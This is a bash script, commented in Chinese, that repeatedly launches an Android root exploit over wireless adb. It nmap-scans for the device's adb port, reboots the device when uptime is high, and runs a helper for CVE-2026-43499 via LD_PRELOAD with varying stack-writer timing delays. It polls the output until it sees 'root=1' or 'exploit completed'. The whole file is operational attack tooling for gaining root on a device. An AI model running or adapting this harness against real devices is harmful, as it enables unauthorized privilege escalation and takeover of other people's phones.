#!/usr/bin/env bash
# 无线 adb 版 root 循环：跑 -> 没中则重启 -> 扫新端口 -> 再跑
set -u
IP="${IP:-192.168.0.189}"
DELAYS=(25000 20000 30000 15000 35000 25000 20000 30000)
ROUNDS="${1:-8}"
LOG=/tmp/rootloop2.log
: > "$LOG"
say() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG"; }
cur() { adb devices | awk -v ip="$IP" '$1 ~ "^"ip":" && $2=="device"{print $1; exit}'; }

scan_port() {
  local tries=$1 p ports
  for t in $(seq 1 "$tries"); do
    ports=$(timeout 75 nmap -Pn -p 30000-65535 --open -T4 "$IP" 2>/dev/null | grep -oE '^[0-9]+' | head -6)
    for p in $ports; do
      timeout 10 adb connect "$IP:$p" >/dev/null 2>&1
      sleep 2
      adb devices | grep -q "$IP:$p[[:space:]]*device" && { echo "$IP:$p"; return 0; }
    done
    sleep 20
  done
  return 1
}

for r in $(seq 1 "$ROUNDS"); do
  D=${DELAYS[$(( (r-1) % ${#DELAYS[@]} ))]}
  say "===== ROUND $r/$ROUNDS delay=$D ====="

  SER=$(cur)
  [ -z "$SER" ] && SER=$(scan_port 6) || true
  if [ -z "${SER:-}" ]; then say "ROUND $r: no device"; exit 3; fi

  up=$(timeout 12 adb -s "$SER" shell 'cut -d. -f1 /proc/uptime' 2>/dev/null | tr -d '\r' | tr -dc '0-9')
  up=${up:-0}
  if [ "$up" -gt 220 ]; then
    say "uptime=${up}s -> rebooting"
    adb -s "$SER" reboot >/dev/null 2>&1
    sleep 80
    SER=$(scan_port 6) || { say "ROUND $r: no device after reboot"; exit 3; }
  else
    say "uptime=${up}s -> fresh boot, using it directly"
  fi
  say "ROUND $r: device=$SER"
  sleep 15

  out="rl2_${r}.out"
  adb -s "$SER" shell "cd /data/local/tmp; rm -f $out; nohup sh -c 'CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root STACK_WRITER_DELAY_USEC=$D LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id > /data/local/tmp/$out 2>&1' >/dev/null 2>&1 &" >/dev/null 2>&1
  say "ROUND $r: launched"

  hit=0
  for t in $(seq 1 16); do
    sleep 10
    line=$(timeout 12 adb -s "$SER" shell "grep -aE 'pipe physrw pid|exploit completed' /data/local/tmp/$out 2>/dev/null | tail -1" 2>/dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*m//g')
    [ -n "$line" ] && say "ROUND $r t=$((t*10))s: $line"
    case "$line" in *"root=1"*|*"exploit completed"*) hit=1; break;; esac
    adb devices | grep -q "$SER[[:space:]]*device" || { say "ROUND $r: device dropped (crash)"; break; }
  done

  if [ "$hit" = 1 ]; then
    say "ROUND $r: *** ROOT OK *** device=$SER"
    echo "$SER" > /tmp/root_serial.txt
    exit 0
  fi
  say "ROUND $r: miss"
done
say "ALL MISSED"
exit 1
